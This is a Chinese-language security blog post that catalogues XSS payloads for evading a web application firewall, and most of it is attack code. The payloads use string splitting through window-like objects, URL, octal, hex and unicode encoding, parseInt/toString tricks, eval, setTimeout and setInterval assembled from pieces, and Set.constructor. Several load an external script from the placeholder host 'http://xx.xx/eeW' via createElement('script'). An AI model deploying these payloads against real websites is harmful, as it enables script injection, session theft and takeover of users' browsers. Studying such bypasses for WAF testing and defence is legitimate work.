## 前言
- - -
对于我这个菜鸟来说，我通过谷歌百度学习到很多前辈的资料，甚至每句话都是他的指导，我也很感激前辈的为我们铺设的道路，让我们更快的成长起来。我也乐于分享，可能有些知识点过于单调或者久远，请见谅。

## waf
- - -
前几天花了10买了一个月的服务器，换个waf来测试。
![1](https://ws1.sinaimg.cn/large/005DAKuvgy1g1xeuqs6nwj30g60cgdge.jpg)   

### Test

遗漏标签就不测试了，上一篇[水文](https://www.anquanke.com/post/id/176185)的分享的标签也可以过，不信找几个试试= =

好吧非常打脸，拦截了。

![2](https://ws1.sinaimg.cn/large/005DAKuvgy1g1xf5z6pwcj30uj0590t6.jpg)

然而换个prompt()函数???免费版当然是这样的啦，高级服务不仅我买不起，还绕不过啊，而且我不是真正的站长，规则我也不会设啊，总之就是这也不会那也不会。

![3](https://ws1.sinaimg.cn/large/005DAKuvgy1g1xf9uioa9j30uj094wf8.jpg)

![4](https://ws1.sinaimg.cn/large/005DAKuvgy1g1xff076fvj30c80c874l.jpg)

### Top属性类似的补充
- - -
还记得上篇的top属性嘛

![5](https://ws1.sinaimg.cn/large/005DAKuvgy1g1xfxfayjoj30kg04ot8n.jpg)

实际上可以利用的还有好几个，看到这里各位是否get到什么了。

![6](https://ws1.sinaimg.cn/large/005DAKuvgy1g1xju6slwuj30ub06raac.jpg)

我们可以利用的类似拼接的对象又多了几个，例如：
```html
//一家人就是要整整齐齐
<details open ontoggle=top['al'%2B'ert'](1) >
<details open ontoggle=self['al'%2B'ert'](1) >
<details open ontoggle=parent['al'%2B'ert'](1) >
<details open ontoggle=frames['al'%2B'ert'](1) >
<details open ontoggle=content['al'%2B'ert'](1) >
<details open ontoggle=window['al'%2B'ert'](1) >
```
这些都可以绕过waf，总结起来有 `top` `self` `parent` `frames` `content` `window`，无疑`top`是最短的，所谓短小精悍，这里借用PKAV的一张ppt。

![7](https://ws1.sinaimg.cn/large/005DAKuvgy1g1xkryc227j30fp073782.jpg)

### 其他补充
除了拆分构造，我们必须要了解还有编码，这个确实是老生常谈的话题，先看个例子吧

将e字母url编码，成功弹窗也绕过waf。
`<details open ontoggle=top['al%65rt'](1) >`
![11](https://ws1.sinaimg.cn/large/005DAKuvgy1g1xte6v6ioj30uj07bwf4.jpg)

其他编码
```html
JS8编码：
<details open ontoggle=top['al\145rt'](1) >
<details open ontoggle=top['\141\154\145\162\164'](1) >
JS16编码：
<details open ontoggle=top['al\x65rt'](1) >
其他
<details open ontoggle=top[/al/.source%2B/ert/.source](1) >
```
### parseInt()与toString()
- - -
**parseInt()**

![12](https://ws1.sinaimg.cn/large/005DAKuvgy1g1xw3xjyifj30nj0b1dga.jpg)

例子: `alert`字符串用`parseInt函数`，以基数为30转化后为`8680439`


![13](https://ws1.sinaimg.cn/large/005DAKuvgy1g1xw6xbo82j30ff05tq2z.jpg)

**toString()**


![14](https://ws1.sinaimg.cn/large/005DAKuvgy1g1xwe1vapzj30g809z0sx.jpg)

例子: `toString函数`将返回的数字`8680439`,以基数为30还原

![15](https://ws1.sinaimg.cn/large/005DAKuvgy1g1xwgo4zb3j30fl083wen.jpg)

这样你就能理解下面这个例子了。
```html
<details open ontoggle=top[8680439..toString(30)](1); >
<details open ontoggle=top[11189117..toString(32)](1); >
```
![16](https://ws1.sinaimg.cn/large/005DAKuvgy1g1xwsdzqctj30uj0930tj.jpg)

### 俩个例子
- - -
**例1**
```html
<img src=1 alt=al lang=ert onerror=top[alt%2blang](0)>
```
这个例子很巧妙，将`alt`和`lang`属性分别赋值合并起来就是`alert`，并在top属性内将2个属性相加。


**例2**
```html
 <details open ontoggle=top[a='al',b='ev',b%2ba]('alert(1)')>
```
在top属性内添加2个变量，并赋值构造eval，然后执行alert(1)

测试下，拦截了。
![8](https://ws1.sinaimg.cn/large/005DAKuvgy1g1xodipv2ej30uj05hmxm.jpg)

其实waf，拦截的是alert这个关键字，换个`prompt()`函数就过了

![9](https://ws1.sinaimg.cn/large/005DAKuvgy1g1xoh9uty6j30uj086q3n.jpg)

也可以选择将`alert(1)`编码，因为有eval存在啊，直接拿来用

```html
<details open ontoggle=top[a='al',b='ev',b%2ba](atob('YWxlcnQoMSk='))>
<details open ontoggle=top[a='al',b='ev',b%2ba]('\141\154\145\162\164\50\61\51')>
<details open ontoggle=top[a='al',b='ev',b%2ba]('\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029')>
```

![10](https://ws1.sinaimg.cn/large/005DAKuvgy1g1xom9zf77j30uj097mxz.jpg)

setTimeout()函数也是没问题的，毕竟也能执行代码。 
```html
<details open ontoggle=top[a='meout',b='setTi',b%2ba]('\141\154\145\162\164\50\61\51')>
```

## eval函数的补充
- - -
#### setTimeout

![19](https://ws1.sinaimg.cn/large/005DAKuvgy1g1ycyd6jedj30no0adt90.jpg)

waf拦截
```html
<svg/onload=setTimeout`alert(1)`>
```
![17](https://ws1.sinaimg.cn/large/005DAKuvgy1g1xy2v7lvnj30uj05d74p.jpg)

编码下，就绕过了。
```html
<svg/onload=setTimeout`alert\u0028233\u0029`>
```
![18](https://ws1.sinaimg.cn/large/005DAKuvgy1g1xy76ggesj30uj0813z5.jpg)

#### setInterval

与`setInterval`不同，对于`setTimeout()`只执行code一次。

![20](https://ws1.sinaimg.cn/large/005DAKuvgy1g1yczzsa24j30no0exwf8.jpg)

`<svg/onload=setInterval('al'%2b'ert(1)')>`

![21](https://ws1.sinaimg.cn/large/005DAKuvgy1g1yd573lavj30uj09qwf9.jpg)

绕过waf，引用外部js。
```html
<svg/onload=setInterval(appendChild(createElement('script')).src='http://xx.xx/eeW')>
```
![22](https://ws1.sinaimg.cn/large/005DAKuvgy1g1yd9dqh46j30uj0e4q4j.jpg)

#### 其他
```html
拆分与编码
<svg/onload=\u0073etInterval(appendChild(createElement('script')).src='http://xx.xx/eeW')>
<svg/onload=\u0073etInterval(appendChild(createElement('sc\162ipt')).src='http://xx.xx/eeW')>
<svg/onload=\u0073etInterval(appendChild(createElement('scr'%2b'ipt')).src='http://xx.xx/eeW')>
<svg/onload=\u0073etInterval(\u0061ppendChild(\u0063reateElement('scr'%2b'ipt')).src='http://xx.xx/eeW')>
 
结合函数：
<iframe onload=s=createElement('script');body.appendChild(s);s.src=['http','://','xx.xx','/eeW'].join('') >
<svg/onload=s=createElement('script');body.appendChild(s);s.src=['http']%2B['://']%2B['xx.xx']%2B['/eeW'].join('') >
<svg/onload=s=\u0063reateElement('scr'%2b'ipt');\u0062ody.\u0061ppendChild(s);s.src='http://x'.concat('x.xx/','eeW'); >
```

### 扩展
- - -

关于运用基于DOM的方法创建和插入节点把外部JS文件注入到网页，这种方法在<<XSS跨站脚本gj剖析与防御>>有介绍过。我这里简单演示下，如果你了解或者不感兴趣可以跳过这段。

首先用createElement方法创建一个script标签。

![23](https://ws1.sinaimg.cn/large/005DAKuvgy1g1ydpwjmafj30fh07jt8s.jpg)

接下来给<script>的src属性设置成外部url
 
![24](https://ws1.sinaimg.cn/large/005DAKuvgy1g1ydrl28mhj30fe0b1jrn.jpg)

可以看到<script>标签以及src属性已经被创建出来，但是并不在页面上输出啊。
 
![25](https://ws1.sinaimg.cn/large/005DAKuvgy1g1yf3ujkccj30fe0a174d.jpg)

我们就要用到appendChild()方法将变量s插入页面。

![26](https://ws1.sinaimg.cn/large/005DAKuvgy1g1yf6k40vgj30fg08gt93.jpg)

再来看看页面上

![27](https://ws1.sinaimg.cn/large/005DAKuvgy1g1yf7nce1dj30fe0620ss.jpg)

### constructor属性
- - -

![28](https://ws1.sinaimg.cn/large/005DAKuvgy1g1yk1fdzqmj30fh07idfu.jpg)

少年!Post到什么了没有。

![29](https://ws1.sinaimg.cn/large/005DAKuvgy1g1yk4ibtegj30m3047weh.jpg)

又是拆分。。注意后面的`()`

```html
<svg/onload=Set.constructor('al'%2b'ert(1)')()>
```
![30](https://ws1.sinaimg.cn/large/005DAKuvgy1g1yk7bt75gj30uj09a3z9.jpg)

反引号我看行。。注意后面2个反引号。

```html
<svg/onload=Set.constructor`al\x65rt\x28/xss/\x29```>
```
![31](https://ws1.sinaimg.cn/large/005DAKuvgy1g1ykdta6tvj30uj0943z9.jpg)

又来引用外部url。编码拆分以及结合函数，请参考上章= =，不然我怕有人说我水。。。

![33](https://ws1.sinaimg.cn/large/005DAKuvgy1g1ykjq4xx5j30k00ha3z9.jpg)

```html
<svg/onload=Set.constructor(appendChild(createElement('script')).src='http://xx.xx/eeW')()>
```
![32](https://ws1.sinaimg.cn/large/005DAKuvgy1g1ykhi14qsj30uj0b63zz.jpg)

### 补充(又是补充，你**就不能一次讲完嘛!写个文章还划水!)
- - -

咳咳，该补充的还是要补充的，除了 Set 对象还有嘛？当然有的。

![33](https://ws1.sinaimg.cn/large/005DAKuvgy1g1ykvh8ot8j30ak08rwhp.jpg)

看些例子，都可以弹窗。

![34](https://ws1.sinaimg.cn/large/005DAKuvgy1g1yl20qvebj30sf09rgm2.jpg)

来个简单拆分。

![35](https://ws1.sinaimg.cn/large/005DAKuvgy1g1yl50p5ykj30uj09at9g.jpg)
 
总结起来就是`Set.constructor` `Map.constructor` `clear.constructor` `Array.constructor` `WeakSet.constructor` (注意区分大小写的)

引用...
